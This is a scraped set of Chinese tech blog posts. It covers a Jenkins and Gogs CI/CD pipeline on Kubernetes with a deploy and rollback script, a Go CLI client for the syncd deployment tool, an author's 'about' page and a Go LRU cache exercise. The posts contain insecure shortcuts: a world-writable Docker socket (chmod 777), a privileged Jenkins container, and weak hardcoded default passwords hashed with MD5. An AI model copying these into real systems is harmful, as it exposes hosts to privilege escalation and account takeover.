具体细节看查询gogs安装\n仓库的webhook设置\n比如我jenkins的job名称为hello-go,jenkins的url为jenkins的部署地址. 则webhook为 http://10.23.168.57:8080/gogs-webhook/?job=hello-go, 记得使用secrets, 避免瞎调用.\njenkins搭建 jenkins搭建, 使用docker进行部署.\n#!/bin/bash docker stop jenkins \u0026amp;\u0026amp; docker rm jenkins docker run --privileged \\  --name jenkins -d \\  -p 8080:8080 -p 50000:50000 \\  -v /srv/jenkins/data:/var/jenkins_home \\  -v /var/run/docker.sock:/var/run/docker.sock \\  -v $(which docker)r:/bin/docker \\  -v /usr/bin/kubectl:/bin/kubectl \\  -v /root/.kube:/var/jenkins_home/.kube uhub.service.ucloud.cn/gitci/blueocaen:latest 这里说明一下, 使用jenkins做发布, 希望jenkins能直接调用kubectl命令来调用apiserver,实现资源管理.同时在jenkins容器内部要完成打包工作. 万一出现docker命令有permission的问题 chmod 777 /var/run/docker.sock.\n配置webhook, 采用gogs的插件, branch 选择为master, 则只构建master的推送, 其他都不进行构建.\njenkins里面的job部署简易脚本. 带回滚的版本, 如果镜像更新失败, 则打印生成的容器100行日志.并执行undo回滚操作.\n#!/bin/bash UPDATE_TIMEOUT=180s LabelSelector=\u0026#34;env=testing,release=${JOB_BASE_NAME}\u0026#34; deploymentName=$(kubectl get deployment -l ${LabelSelector} -o go-template --template=\u0026#39;{{range .items}}{{ .metadata.name}}{{end}}\u0026#39;) [[ -d hello ]] \u0026amp;\u0026amp; rm -rf hello/ git clone git@10.23.168.57:louis/hello.git cd hello/ docker build -t uhub.service.ucloud.cn/gitci/hello-go:${BUILD_NUMBER} . docker push uhub.service.ucloud.cn/gitci/hello-go:${BUILD_NUMBER} kubectl set image deploy ${deploymentName} *=uhub.service.ucloud.cn/gitci/hello-go:${BUILD_NUMBER} timeout --signal SIGKILL ${UPDATE_TIMEOUT} kubectl rollout status deployment ${deploymentName} if [[ $? -ne 0 ]];then echo \u0026#34;################# Update timeout， rollback!!!!!\u0026#34; samplePod=$(kubectl get po -l ${LabelSelector} | awk \u0026#39;NR\u0026gt;1{print $1;exit}\u0026#39;) kubectl logs --tail=100 ${samplePod} kubectl rollout undo deployment ${deploymentName} exit 500 fi gogs的push输出的日志.\nGogs-ID: ceaba96b-9a78-424f-a128-2f6d49d1acfc Running as SYSTEM Building in workspace /var/jenkins_home/workspace/hello-go [hello-go] $ /bin/sh -xe /tmp/jenkins1322734338419902619.sh + UPDATE_TIMEOUT=180s + LabelSelector='env=testing,release=hello-go' + kubectl get deployment -l 'env=testing,release=hello-go' -o go-template '--template={{range .items}}{{ .metadata.name}}{{end}}' + deploymentName=hello-world-deployment + '[[' -d hello ]] + git clone git@10.23.168.57:louis/hello.git Cloning into 'hello'... + cd hello/ + docker build -t uhub.service.ucloud.cn/gitci/hello-go:2 . Sending build context to Docker daemon 54.78kB Step 1/10 : FROM uhub.service.ucloud.cn/hahahahaha/golang:1.12.7 AS builder ---\u0026gt; be63d15101cb Step 2/10 : ENV GO111MODULE=on ---\u0026gt; Using cache ---\u0026gt; c85ce3a02464 Step 3/10 : ENV GOPROXY=https://goproxy.io ---\u0026gt; Using cache ---\u0026gt; eb6fe76cb916 Step 4/10 : WORKDIR /root ---\u0026gt; Using cache ---\u0026gt; 87c78943ae7a Step 5/10 : COPY hello-ucloud.go . ---\u0026gt; Using cache ---\u0026gt; ac1cc24cf35c Step 6/10 : RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o /deploy hello-ucloud.go ---\u0026gt; Using cache ---\u0026gt; c041bea3c691 Step 7/10 : FROM alpine:3.7 ---\u0026gt; 6d1ef012b567 Step 8/10 : RUN apk add tzdata ca-certificates \u0026amp;\u0026amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \u0026amp;\u0026amp; echo \u0026quot;Asia/Shanghai\u0026quot; \u0026gt; /etc/timezone \u0026amp;\u0026amp; apk del tzdata \u0026amp;\u0026amp; rm -rf /var/cache/apk/* \u0026amp;\u0026amp; sed -i 's/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g' /etc/apk/repositories \u0026amp;\u0026amp; apk add --no-cache git \u0026amp;\u0026amp; apk add --no-cache openssh ---\u0026gt; Using cache ---\u0026gt; e82cf08ba888 Step 9/10 : COPY --from=builder /deploy /bin/deploy ---\u0026gt; Using cache ---\u0026gt; da478659e18e Step 10/10 : ENTRYPOINT [\u0026quot;/bin/deploy\u0026quot;] ---\u0026gt; Using cache ---\u0026gt; 47b75b287f9a Successfully built 47b75b287f9a Successfully tagged uhub.service.ucloud.cn/gitci/hello-go:2 + docker push uhub.service.ucloud.cn/gitci/hello-go:2 The push refers to repository [uhub.service.ucloud.cn/gitci/hello-go] 472428a9d8ca: Preparing d1d372f97ce2: Preparing 3fc64803ca2d: Preparing 472428a9d8ca: Layer already exists d1d372f97ce2: Layer already exists 3fc64803ca2d: Layer already exists 2: digest: sha256:0a5e3faf33f3514ab188a6bdb28ca5f8915e9cad791d667827237ecffc3dbd25 size: 950 + kubectl set image deploy hello-world-deployment '*=uhub.service.ucloud.cn/gitci/hello-go:2' deployment.extensions/hello-world-deployment image updated + timeout --signal SIGKILL 180s kubectl rollout status deployment hello-world-deployment Waiting for deployment \u0026quot;hello-world-deployment\u0026quot; rollout to finish: 1 out of 2 new replicas have been updated... Waiting for deployment \u0026quot;hello-world-deployment\u0026quot; rollout to finish: 1 out of 2 new replicas have been updated... Waiting for deployment \u0026quot;hello-world-deployment\u0026quot; rollout to finish: 1 out of 2 new replicas have been updated... Waiting for deployment \u0026quot;hello-world-deployment\u0026quot; rollout to finish: 1 old replicas are pending termination... Waiting for deployment \u0026quot;hello-world-deployment\u0026quot; rollout to finish: 1 old replicas are pending termination... deployment \u0026quot;hello-world-deployment\u0026quot; successfully rolled out + '[[' 0 -ne 0 ]] Finished: SUCCESS 推送一个push-trigger,立马就更新了.\n源码仓库在gogs.wangke.co\n不足之处 项目的镜像打包, 到docker push, 在生产环境的时候, 应该分别构建, 万一构建镜像失败则直接返回, 不用调用api了, 调用kubeapi操作应该在构建镜像之后分开脚本. 这里因为是test环境, 所以放在一起了.\n参考  u8ks  ","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-uk8s-ci-cd/","tags":["pv","ci","pvc","kubernetes","uk8s","jenkins","gogs"],"title":"基于uk8s部署的CI/CD"},{"categories":["syncd"],"contents":"介绍  syncd-cli 是自动化部署工具 syncd 的一个命令行客户端，用于批量添加server，实现一键自动添加，提高开发效率。\n  Syncd是一款开源的代码部署工具，它具有简单、高效、易用等特点，可以提高团队的工作效率。\n 安装 required要求\n go1.8+ syncd2.0+  go get 方式\n$ go get gogs.wangke.co/go/syncd-cli $ syncd-cli -h git clone 方式\n$ git clone https://gogs.wangke.co/go/syncd-cli.git $ cd syncd-cli \u0026amp;\u0026amp; go build -o syncd-cli syncd-cli.go $ ./syncd-cli -h Usage @v1.0.0 # ./syncd-cli -h [12:18:53] syncd-cli version:1.0.0 Usage syncd-cli \u0026lt;command\u0026gt; [-aupginsh] command [--add] [--list] [user|server] add server example: 1) syncd-cli -d server -g 2 -i 192.168.1.1,test.example.com -n test01,test02 -s 9527,22 2) syncd-cli --add server --roleGroupId 2 --ipEmail 192.168.1.1 --names test01 --sshPort 9527 add user example: 1) syncd-cli --add user --ipEmail text@wangke.co --names test01 2) syncd-cli -d user -i text@wangke.co -n test01 list server and user example: 1) syncd-cli -l user 2) syncd-cli -l server 3) syncd-cli --list 4) syncd-cli --list server Options: -d, --add string add user or server -h, --help this help -a, --hostApi string sycnd server addr api (default \u0026#34;http//127.0.0.1:8878/\u0026#34;) -i, --ipEmail strings set ip/hostname to the cluster with names // or email for add user, use \u0026#39;,\u0026#39; to split -l, --list string list server or user -n, --names strings set names to the cluster with ips, use \u0026#39;,\u0026#39; to split -p, --password string password for syncd tools (default \u0026#34;111111\u0026#34;) -g, --roleGroupId int group_id for cluster // or role_id for user, must be needed (default 1) -s, --sshPort ints set sshPort to the cluster server, use \u0026#39;,\u0026#39; to split -u, --user string user for syncd tools (default \u0026#34;syncd\u0026#34;) @v1.1.0 从命令行读取批量文件的信息,感觉太冗余了, 不方便创建,还是以文件的方式创建批量容易一点, 所用想了一个从文件里面读取信息,然后根据信息创建相应资源的方法.\n$ ./syncd-cli -h syncd-cli version:1.1.0 Usage syncd-cli \u0026lt;command\u0026gt; [-afhpu] command \u0026lt;apply\u0026gt;|\u0026lt;get\u0026gt; [user|server] \u0026lt;?-f files\u0026gt; add server example: 1) syncd-cli apply user -f files 2) syncd-cli apply server -f files list server and user example: 1) syncd-cli get user 2) syncd-cli get server Options: -f, --file string add server/user from files -h, --help this help -a, --hostApi string sycnd server addr api (default \u0026#34;http://127.0.0.1:8878/\u0026#34;) -p, --password string password for syncd tools (default \u0026#34;111111\u0026#34;) -u, --user string user for syncd tools (default \u0026#34;syncd\u0026#34;) file文件的格式\ntestserver,testuser等文件名称无要求, 但是对文件的格式要求.以一个空格进行分割.\n# 第一列是groupid,对应的集群id; # 第二列是name, 对应的是server的名字 # 第三列是ip/hostname, 对应server的ip或者域名 # 第四列是sshport, 对应的是server的ssh端口 $ cat testserver 1 test01 test.wangke.co 22 1 test02 test01.wangke.co 9527 1 test03 test02.wangke.co 6822 testuser文件内容以空格区分,共四列.(后续可以添加至6列,源码的user还有电话号码,真实姓名等,非必须 批量创建的默认密码为111111)\n# 第一列是role_id, 对应的是角色, 比如1是管理员 # 第二列是name, 对应的是用户名 # 第三列是email, 对应的是用户的邮箱 # 第四列是status, 对应的是用户能否登陆. $ cat testuser 1 test01 test01@wangke.co 1 1 test02 test02@wangke.co 1 因为testuser和testserver的的文件格式和数据类型是一样的, 所用到的方法是一样的, 唯一的区分就是利用apply user还是apply server\ntype server struct { id int name string ip string port int } type user struct { id int name string email string status int } 重要提醒  方法是一样的. 所以标志位很重要, 不然创建错了就是连环错误了. $ syncd-cli apply user -f testuser $ syncd-cli apply server -f testserver Example root@master-louis: ~/go/src/github.com/oldthreefeng/syncd-cli master ⚡ # ./syncd-cli -i 192.168.1.2,text.example.com -n test1,texte -s 9527,22 [12:18:58] INFO[0000] your token is under .syncd-token INFO[0000] group_id=1\u0026amp;name=test1\u0026amp;ip=192.168.1.2\u0026amp;ssh_port=9527 INFO[0000] {\u0026quot;code\u0026quot;:0,\u0026quot;message\u0026quot;:\u0026quot;success\u0026quot;} INFO[0000] group_id=1\u0026amp;name=texte\u0026amp;ip=text.example.com\u0026amp;ssh_port=22 INFO[0000] {\u0026quot;code\u0026quot;:0,\u0026quot;message\u0026quot;:\u0026quot;success\u0026quot;} # 将test01邮箱为text@wangke.co加入管理员,默认密码为111111 $./syncd-cli -d user -i text@wangke.co -n test01 time=\u0026quot;2019-10-20T17:59:08+08:00\u0026quot; level=info msg=\u0026quot;your token is under .syncd-token\\n\u0026quot; time=\u0026quot;2019-10-20T17:59:08+08:00\u0026quot; level=info msg=\u0026quot;role_id=1\u0026amp;username=test01\u0026amp;password=1111111\u0026amp;email=text@wangke.co\u0026amp;status=1\u0026quot; time=\u0026quot;2019-10-20T17:59:08+08:00\u0026quot; level=info msg=\u0026quot;{\\\u0026quot;code\\\u0026quot;:0,\\\u0026quot;message\\\u0026quot;:\\\u0026quot;success\\\u0026quot;}\u0026quot; 添加如下: 算法思路 本来想开发和kubectl,go,kubeadm等类似的管理cli. 奈何时间水平有限.\n脑子里想的是这样的\n$ syncd get user $ syncd get server $ syncd apply -f adduser.yaml 实际上\u0026hellip;\n$ syncd-cli --list user $ syncd-cli --list server $ syncd-cli --add user -i test@wangke.co -n test01  整体上, 利用http的GET还有POST完成显示和添加动作的. gorequest的GET/POST的确好用,可以试试.\n记录日志当然是用的logrus, 当时用的go mod学习教程就是用的这个模板, 日志的格式也可以.\n命令行的开发主要就是用的pflag, 看了kubernetes和docker源码相关, kubectl等命令行管理工具也是基于这个开发的.\n 首先, 登录验证, 获取token, 将token存入当前目录下的.syncd-token, 其次, 获取user/server列表或者添加user/server, 逻辑都是一样的,发送POST请求, 同时携带cookie, 将cookie的name和value封装成http.cookie, 每次需要用到,直接调用即可.\n代码 /* Copyright 2019 louis. @Time : 2019/10/20 10:00 @Author : louis @File : syncd-cli @Software: GoLand */ package main import ( \u0026#34;bufio\u0026#34; \u0026#34;crypto/md5\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;encoding/json\u0026#34; \u0026#34;errors\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;github.com/parnurzeal/gorequest\u0026#34; log \u0026#34;github.com/sirupsen/logrus\u0026#34; flag \u0026#34;github.com/spf13/pflag\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; ) const ( tokenFile = \u0026#34;.syncd-token\u0026#34; agent = \u0026#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0\u0026#34; ) var ( //host = \u0026#34;https://syncd.fenghong.tech/\u0026#34; \thost string list string user string password string GroupId int Names []string Ips []string SSHPort []int add string files string h bool ) var _token string func TokenFail() { RemoveToken() panic(fmt.Sprintf(\u0026#34;login faild, please set the right password\u0026#34;)) } func RemoveToken() { if err := os.Remove(tokenFile); err != nil { log.Infoln(\u0026#34;remove .token failed\u0026#34;) } } func SetToken(token string) { err := ioutil.WriteFile(tokenFile, []byte(token), 0644) if err != nil { log.Fatalln(err) } _token = token } func GetToken() string { if _token == \u0026#34;\u0026#34; { tokenByte, err := ioutil.ReadFile(tokenFile) if err != nil { log.Fatalln(\u0026#34;need login\u0026#34;) } _token = string(tokenByte) } return _token } func md5s(s string) string { h := md5.New() h.Write([]byte(s)) return hex.EncodeToString(h.Sum(nil)) } type RespData map[string]interface{} type Response struct { Code int `json:\u0026#34;code\u0026#34;` Message string `json:\u0026#34;message\u0026#34;` Data RespData `json:\u0026#34;data\u0026#34;` } func listServerDetail(res RespData) { for _, v := range res { fmt.Println(v) } } func ParseResponse(respBody string) (RespData, error) { response := Response{} err := json.Unmarshal([]byte(respBody), \u0026amp;response) if err != nil { panic(err) } if response.Code == 1005 { TokenFail() } if response.Code != 0 { return nil, errors.New(response.Message) } return response.Data, nil } func login(user, password string) { url := host + \u0026#34;api/login\u0026#34; _, _, errs := gorequest.New(). Post(url). Type(\u0026#34;form\u0026#34;). AppendHeader(\u0026#34;Accept\u0026#34;, \u0026#34;application/json\u0026#34;). Send(fmt.Sprintf(\u0026#34;username=%s\u0026amp;password=%s\u0026#34;, user, md5s(password))). End(func(response gorequest.Response, body string, errs []error) { if response.StatusCode != 200 { panic(fmt.Sprintf(\u0026#34;%s\u0026#34;, errs)) } respData, err := ParseResponse(body) if err != nil { panic(err) } //respData \tSetToken(respData[\u0026#34;token\u0026#34;].(string)) }) if errs != nil { log.Fatalf(\u0026#34;%s\u0026#34;, errs) } log.Infof(\u0026#34;your token is under %s\\n\u0026#34;, tokenFile) } func userAdd(roleId int, userName, email string, status int) { url := host + \u0026#34;api/user/add\u0026#34; pass := \u0026#34;111111\u0026#34; _, body, errs := gorequest.New().Post(url). AppendHeader(\u0026#34;Accept\u0026#34;, \u0026#34;application/json\u0026#34;). AppendHeader(\u0026#34;User-Agent\u0026#34;, agent). AddCookie(authCookie()). Send(fmt.Sprintf(\u0026#34;role_id=%d\u0026amp;username=%s\u0026amp;password=%s\u0026amp;email=%s\u0026amp;status=%d\u0026#34;, roleId, userName, md5s(pass), email, status)). End(func(response gorequest.Response, body string, errs []error) { if response.StatusCode != 200 { panic(errs) } }) if errs != nil { log.Fatalln(errs) } log.Infof(\u0026#34;role_id=%d\u0026amp;username=%s\u0026amp;password=%s\u0026amp;email=%s\u0026amp;status=%d\u0026#34;, roleId, userName, pass, email, status) log.Infoln(body) } func serverAdd(groupId int, name, ip string, sshPort int) { url := host + \u0026#34;api/server/add\u0026#34; _, body, errs := gorequest.New().Post(url). AppendHeader(\u0026#34;Accept\u0026#34;, \u0026#34;application/json\u0026#34;). AppendHeader(\u0026#34;User-Agent\u0026#34;, agent). AddCookie(authCookie()). Send(fmt.Sprintf(\u0026#34;group_id=%d\u0026amp;name=%s\u0026amp;ip=%s\u0026amp;ssh_port=%d\u0026#34;, groupId, name, ip, sshPort)). End(func(response gorequest.Response, body string, errs []error) { if response.StatusCode != 200 { panic(errs) } }) if errs != nil { log.Fatalln(errs) } log.Infof(\u0026#34;group_id=%d\u0026amp;name=%s\u0026amp;ip=%s\u0026amp;ssh_port=%d\\n\u0026#34;, groupId, name, ip, sshPort) log.Infoln(body) } type QueryBind struct { Keyword string `form:\u0026#34;keyword\u0026#34;` Offset int `form:\u0026#34;offset\u0026#34;` Limit int `form:\u0026#34;limit\u0026#34; binding:\u0026#34;required,gte=1,lte=999\u0026#34;` } func List(api string) { url := host + api _, body, errs := gorequest.New().Get(url).Query(QueryBind{Keyword: \u0026#34;\u0026#34;, Offset: 0, Limit: 7}). AppendHeader(\u0026#34;Accept\u0026#34;, \u0026#34;application/json\u0026#34;). AppendHeader(\u0026#34;User-Agent\u0026#34;, agent). AddCookie(authCookie()). End() if errs != nil { log.Fatalln(errs) } var serverBody Response err := json.Unmarshal([]byte(body), \u0026amp;serverBody) if err != nil { log.Fatalln(err) } //log.Infoln(serverBody) \tlistServerDetail(serverBody.Data) } func authCookie() *http.Cookie { cookie := http.Cookie{} cookie.Name = \u0026#34;_syd_identity\u0026#34; cookie.Value = GetToken() return \u0026amp;cookie } func usages() { _, _ = fmt.Fprintf(os.Stderr, `syncd-cli version:1.1.0 Usage syncd-cli \u0026lt;command\u0026gt; [-afhpu] command \u0026lt;apply|get\u0026gt; \u0026lt;user|server\u0026gt; [?-f files] add server example: 1) syncd-cli apply user -f files 2) syncd-cli apply server -f files list server and user example: 1) syncd-cli get user 2) syncd-cli get server Options: `) flag.PrintDefaults() } func init() { flag.StringVarP(\u0026amp;host, \u0026#34;hostApi\u0026#34;, \u0026#34;a\u0026#34;, \u0026#34;http://127.0.0.1:8878/\u0026#34;, \u0026#34;sycnd server addr api\u0026#34;) //flag.StringVarP(\u0026amp;host, \u0026#34;hostApi\u0026#34;, \u0026#34;a\u0026#34;, \u0026#34;https://syncd.fenghong.tech/\u0026#34;, \u0026#34;sycnd server addr api\u0026#34;) \tflag.StringVarP(\u0026amp;user, \u0026#34;user\u0026#34;, \u0026#34;u\u0026#34;, \u0026#34;syncd\u0026#34;, \u0026#34;user for syncd tools\u0026#34;) flag.StringVarP(\u0026amp;password, \u0026#34;password\u0026#34;, \u0026#34;p\u0026#34;, \u0026#34;111111\u0026#34;, \u0026#34;password for syncd tools\u0026#34;) flag.StringVarP(\u0026amp;add, \u0026#34;add\u0026#34;, \u0026#34;d\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;add user or server(deprecated)\u0026#34;) flag.StringVarP(\u0026amp;files, \u0026#34;file\u0026#34;, \u0026#34;f\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;add server/user from files\u0026#34;) flag.StringVarP(\u0026amp;list, \u0026#34;list\u0026#34;, \u0026#34;l\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;list server and user(deprecated)\u0026#34;) flag.IntVarP(\u0026amp;GroupId, \u0026#34;roleGroupId\u0026#34;, \u0026#34;g\u0026#34;, 1, \u0026#34;group_id for cluster // or role_id for user, must be needed(deprecated)\u0026#34;) flag.StringSliceVarP(\u0026amp;Ips, \u0026#34;ipEmail\u0026#34;, \u0026#34;i\u0026#34;, []string{\u0026#34;\u0026#34;}, \u0026#34;set ip/hostname to the cluster with names // or email for add user, use \u0026#39;,\u0026#39; to split(deprecated)\u0026#34;) flag.StringSliceVarP(\u0026amp;Names, \u0026#34;names\u0026#34;, \u0026#34;n\u0026#34;, []string{\u0026#34;\u0026#34;}, \u0026#34;set names to the cluster with ips, use \u0026#39;,\u0026#39; to split(deprecated)\u0026#34;) flag.IntSliceVarP(\u0026amp;SSHPort, \u0026#34;sshPort\u0026#34;, \u0026#34;s\u0026#34;, []int{}, \u0026#34;set sshPort to the cluster, use \u0026#39;,\u0026#39; to split(deprecated)\u0026#34;) flag.BoolVarP(\u0026amp;h, \u0026#34;help\u0026#34;, \u0026#34;h\u0026#34;, false, \u0026#34;this help\u0026#34;) flag.Usage = usages } func useV100() { //是否列出server,user  switch list { case \u0026#34;user\u0026#34;: List(\u0026#34;api/user/list\u0026#34;) case \u0026#34;server\u0026#34;: List(\u0026#34;api/server/list\u0026#34;) default: fmt.Println(\u0026#34;use `syncd-cli get [user | server]` instead\u0026#34;) } if Ips[0] == \u0026#34;\u0026#34; || Names[0] == \u0026#34;\u0026#34; || SSHPort[0] == 0 { return } switch add { case \u0026#34;user\u0026#34;: // userAdd() //easy to add \tfor k, v := range Ips { userAdd(GroupId, Names[k], v, 1) } case \u0026#34;server\u0026#34;: // Ips未指定,则返回 \tfor k, v := range Ips { serverAdd(GroupId, Names[k], v, SSHPort[k]) } } } type server struct { gid int name string ip string port int } func readFromServerFile(file string) []server { openFile, err := os.Open(file) if err != nil { log.Fatalf(\u0026#34;%v\u0026#34;,err) } defer openFile.Close() var newserver []server scanner := bufio.NewScanner(openFile) scanner.Split(bufio.ScanLines) for scanner.Scan() { line := scanner.Text() if len(line) == 0 { break } var gid, port int var name, ip string _, err := fmt.Sscanf(line, \u0026#34;%d %s %s %d\u0026#34;, \u0026amp;gid, \u0026amp;name, \u0026amp;ip, \u0026amp;port) if err != nil { return nil } newserver = append(newserver, server{ gid: gid, name: name, ip: ip, port: port, }) } return newserver } func main() { flag.Parse() if h { flag.Usage() return } // 登录认证 \tlogin(user, password) // 使用v1.0.0 \tif list != \u0026#34;\u0026#34; { useV100() } switch os.Args[1] { case \u0026#34;apply\u0026#34;: switch os.Args[2] { case \u0026#34;server\u0026#34;: ser := readFromServerFile(files) for _, v := range ser { serverAdd(v.gid, v.name, v.ip, v.port) } case \u0026#34;user\u0026#34;: usr := readFromServerFile(files) for _, v := range usr { // 偷个懒, 数据类型一样,结构一样, 所以从文件读取的是一样的 \t// v.gid ==\u0026gt; roleId \t// v.name==\u0026gt; username \t// v.ip ==\u0026gt; email \t// v.port==\u0026gt; status \tuserAdd(v.gid, v.name, v.ip, v.port) } default: fmt.Println(\u0026#34;syncd-cli apply [user|server] -f files\u0026#34;) } case \u0026#34;get\u0026#34;: switch os.Args[2] { case \u0026#34;user\u0026#34;: List(\u0026#34;api/user/list\u0026#34;) case \u0026#34;server\u0026#34;: List(\u0026#34;api/server/list\u0026#34;) default: fmt.Println(\u0026#34;syncd-cli get [user | server]\u0026#34;) } default: fmt.Println() fmt.Println(\u0026#34;\tUse syncd-cli@v1.1.0 instead\u0026#34;) fmt.Println(\u0026#34;syncd-cli \u0026lt;get|apply\u0026gt; \u0026lt;user|server\u0026gt; [?-f filename\u0026gt;]\u0026#34;) fmt.Println(\u0026#34;syncd-cli \u0026lt;get|apply\u0026gt; \u0026lt;user|server\u0026gt; [?--file filename]\u0026#34;) } } ","permalink":"https://www.fenghong.tech/blog/go/go-syncd-cli/","tags":["go","gin","flag","syncd","gorequest","logrus"],"title":"syncd-cli 介绍及用法"},{"categories":null,"contents":"联系我: 992165098@qq.com louisehong4168@gmail.com\n2016-07-06 学习linux基础, 从命令行到bash shell, 到内存, 进程, io, 网络, awk, sed, grep 文本处理. 学习linux的磁盘阵列. 学习ssh相关概念, 从密码到秘钥的认知, 学习密码学基础.对称秘钥非对称秘钥.\n2017-08-04 熟悉分布式, 高可用, 主备, 双活相关概念,\n2017-09-25 近期在学习linux的服务, 比如lvs, nginx, smb, nfs, apache, iptabels, mysql, redis, haproxy, keepalived, tomcat, jetty, OpenStack, jenkins, git, ansible\n2018-04-22 近期在学习docker，kubernetes中\u0026hellip;\u0026hellip; Python、go、java等编程语言的学习也纳入了范畴，会慢慢捣鼓的.\n2018-08-22 运维行业宽如海\n2018-11-06 本地和vps的文件全部被删，被损坏。花了3天才恢复过来了。不过 我文章的热度排行，这些都没了。。。。\n2018-12-28 我的wiki最近也加了点东西。\n2019-05-15 深入学习jenkins, gogs, 持续集成.\n2019-07-16 golang开始入门学习.\n2019-10-10 blog转移至hugo, 主要是hexo生成太慢,100篇文章要一分钟,而且很多格式乱码.\n2019-10-18\n离职了, 互联网金融彻底不行了, 消失在黑暗中, 成为历史.\n2019-11-06\n近期在学微服务相关, 如服务发现之 consul, 集群消息队列rabbitMq, 分布式配置管理值 apollo. 增加自己的集群管理能力, 集群高可用. 加强监控管理概念.\n Apollo（阿波罗）是携程框架部门研发的分布式配置中心，能够集中化管理应用不同环境、不同集群的配置，配置修改后能够实时推送到应用端，并且具备规范的权限、流程治理等特性，适用于微服务配置管理场景。\n 2020-06-30\n构建公司测试/开发的kubernetes环境, 从git push 到 应用部署, 由jenkins + k8s 接管. 快速迭代开发测试.\n整体架构使用frp + 负载均衡 + kubernetes , 实现内网对外服务.\n","permalink":"https://www.fenghong.tech/about/about/","tags":null,"title":"关于"},{"categories":["algorithm","golang"],"contents":"操作系统内存的管理  关于操作系统内存管理，如何节省利用容量不大的内存多的进程提供资源。而内存的虚拟存储管理是现在最通用，最成功的方式。在内存有限的情况下，扩展一部分外存作为虚拟内存，真正的内存只存储当前运行时所用到的信息，极大的扩充了内存的功能，极大提高计算机的并发度，虚拟页式存储管理，则是将进程所需空间划分为多个页面，内存中只存放当前所需页面，将其余页面放入外存的管理方式.\n  虚拟页式存储管理增加了进程所需的内存空间，却也带来了运行时间变长这一缺点，运行过程中，需要将外存中存放的信息和内存中已有的进行交换，由于外存的低速，影响了运行时间因此，应当采取尽量好的算法以减少读取外存的次数.\n  对于虚拟页式存储，内外存信息替换是以页面为单位进行的，当需要一个外存中的页面是 将它调入内存，同时为了保持原有空间大小，我们需要不断地剔除掉一些存页面。数据块大小有限，因此我们需要每次调用外存数据时，都能准确的命中。这时就需要一个较好的页面管理算法.\n LRU LRU是Least Recently Used的缩写，即最近最少使用，是一种常用的页面置换算法，选择最近最久未使用的页面予以淘汰。该算法赋予每个页面一个访问字段，用来记录一个页面自上次被访问以来所经历的时间 t，当须淘汰一个页面时，选择现有页面中其 t 值最大的，即最近最少使用的页面予以淘汰。\nLRU缓存机制 设计和实现一个  LRU (最近最少使用) 缓存机制。它应该支持以下操作： 获取数据 get 和 写入数据put。\n获取数据 get(key) - 如果密钥 (key) 存在于缓存中，则获取密钥的值（总是正数），否则返回 -1。 写入数据 put(key, value) - 如果密钥不存在，则写入其数据值。当缓存容量达到上限时，它应该在写入新数据之前删除最近最少使用的数据值，从而为新的数据值留出空间。\n示例:\nLRUCache cache = new LRUCache( 2 /* 缓存容量 */ ); cache.put(1, 1); cache.put(2, 2); cache.get(1); // 返回 1 cache.put(3, 3); // 该操作会使得密钥 2 作废 cache.get(2); // 返回 -1 (未找到) cache.put(4, 4); // 该操作会使得密钥 1 作废 cache.get(1); // 返回 -1 (未找到) cache.get(3); // 返回 3 cache.get(4); // 返回 4  思路  这个问题可以用哈希表，辅以双向链表记录键值对的信息。所以可以在 O(1) 时间内完成 put 和 get 操作，同时也支持 O(1) 删除第一个添加的节点。 如果key存在缓存中, 则获取key的value 每次数据项被查询到时，都将此数据项移动到链表头部（O(1)的时间复杂度） 这样，在进行过多次查找操作后，最近被使用过的内容就向链表的头移动，而没有被使用的内容就向链表的后面移动 当需要替换时，链表最后的位置就是最近最少被使用的数据项，我们只需要将最新的数据项放在链表头部， 当Cache满时，淘汰链表最后的位置就是了。\n/* @Time : 2019/10/12 10:04 @Author : louis @File : 146-lrucache @Software: GoLand */ package leetcode import \u0026#34;container/list\u0026#34; // 内存缓存LRU算法: 最近最少使用  type LRUCache struct { cap int // capacity \tl *list.List // doubly linked list \tm map[int]*list.Element // hash table for checking if list node exists } type pair struct { key int value int } func NewLRU(capacity int) LRUCache { return LRUCache{ cap: capacity, l: new(list.List), m: make(map[int]*list.Element, capacity), } } // 如果key存在缓存中, 则获取key的value // 每次数据项被查询到时，都将此数据项移动到链表头部（O(1)的时间复杂度） // 这样，在进行过多次查找操作后，最近被使用过的内容就向链表的头移动，而没有被使用的内容就向链表的后面移动 // 当需要替换时，链表最后的位置就是最近最少被使用的数据项，我们只需要将最新的数据项放在链表头部， // 当Cache满时，淘汰链表最后的位置就是了。 func (lru *LRUCache) Get(key int) int { if node, ok := lru.m[key]; ok { val := node.Value.(*list.Element).Value.(pair).value //move the node to front \tlru.l.MoveToFront(node) return val } return -1 } // 写入数据, 如果key不存在, 则写入其数据值, 当缓存容量达到上限时, // 它应该在写入新数据之前删除最近最少使用的value. func (lru *LRUCache) Put(key, value int) { if node, ok := lru.m[key]; ok { // 存在,则直接移动node到链表首部,并更新value \tlru.l.MoveToFront(node) node.Value.(*list.Element).Value = pair{key: key, value: value} } else { // list 满了之后 ; 删除链表的最后一个节点 \tif lru.l.Len() == lru.cap { delIndex := lru.l.Back().Value.(*list.Element).Value.(pair).key // 删除hashMap里面的最后的元素 \tdelete(lru.m, delIndex) // 删除list最后一个节点 \tlru.l.Remove(lru.l.Back()) } // 初始化node节点 \tnode := \u0026amp;list.Element{ Value: pair{ key: key, value: value, }, } // 将新的node节点放入list \tp := lru.l.PushFront(node) lru.m[key] = p } } 测试用例 package leetcode import ( \u0026quot;fmt\u0026quot; \u0026quot;testing\u0026quot; ) func TestConstructorLRU(t *testing.T) { var cache = NewLRU(2) cache.Put(1,1) cache.Put(2,2) fmt.Println(cache.Get(1)) cache.Put(3,3) fmt.Println(cache.Get(2)) fmt.Println(cache.Get(3)) cache.Put(4,4) fmt.Println(cache.Get(1)) fmt.Println(cache.Get(3)) fmt.Println(cache.Get(4)) //1 -1 3 -1 3 4 } 